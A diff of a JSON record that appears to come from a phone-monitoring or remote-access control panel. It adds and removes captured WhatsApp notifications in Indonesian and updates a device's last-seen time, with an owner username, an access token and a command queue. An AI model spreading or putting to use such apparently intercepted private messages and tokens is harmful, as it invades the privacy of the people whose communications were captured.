@@ -22,6 +22,14 @@
     "smsMessages": [
       {
         "appName": "WhatsApp",
+        "sender": "‎𝘼𝙈𝘽𝘼𝙇𝙄𝙂𝙃𝙏𝙉𝙄𝙉𝙂⚡ (142 pesan): ~ ⸸𝟕𝟎𝟓 || 𝘇̵𝝴ׂ𝘆𝘆𐐼ׅ𐐼ׅ",
+        "content": "atmn ny baik bgt",
+        "time": "29/04 20:54",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1777466622772
+      },
+      {
+        "appName": "WhatsApp",
         "sender": "‎𝐓𝐚𝐠 𝐬𝐰 𝟑 (330 pesan): ~ ~?",
         "content": "Menyebut grup Anda secara privat di status",
         "time": "29/04 20:54",
@@ -4011,14 +4019,6 @@
         "time": "29/04 20:49",
         "pkg": "com.whatsapp",
         "receivedAt": 1777466287782
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎1692 pesan dari 19 chat",
-        "time": "29/04 20:49",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1777466286549
       }
     ],
     "galleryPhotos": [],
@@ -4069,7 +4069,7 @@
     "deviceName": "HP-AGUSGANTENG123-3E9A",
     "ownerUsername": "zaa",
     "token": "20fdcadc903f75b92eda3edefa92e509",
-    "lastSeen": 1777466616453,
+    "lastSeen": 1777466622466,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-27T07:37:12.639Z",
